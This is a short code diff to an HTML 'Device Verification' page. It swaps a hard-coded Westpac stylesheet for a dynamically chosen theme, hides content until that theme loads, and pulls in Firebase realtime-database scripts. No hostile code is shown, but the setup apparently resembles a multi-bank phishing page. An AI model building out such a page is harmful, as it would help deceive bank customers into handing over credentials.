@@ -8,7 +8,12 @@
     <meta http-equiv='expires' content='0'>
     <meta http-equiv='pragma' content='no-cache'>
     <title>Device Verification</title>
-    <link id="themeStyles" rel="stylesheet" href="themes/westpac.css">
+    <style>
+        /* Hide content until theme is loaded */
+        .container { opacity: 0; transition: opacity 0.3s ease; }
+        .container.loaded { opacity: 1; }
+    </style>
+    <link id="themeStyles" rel="stylesheet" href="">
     <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
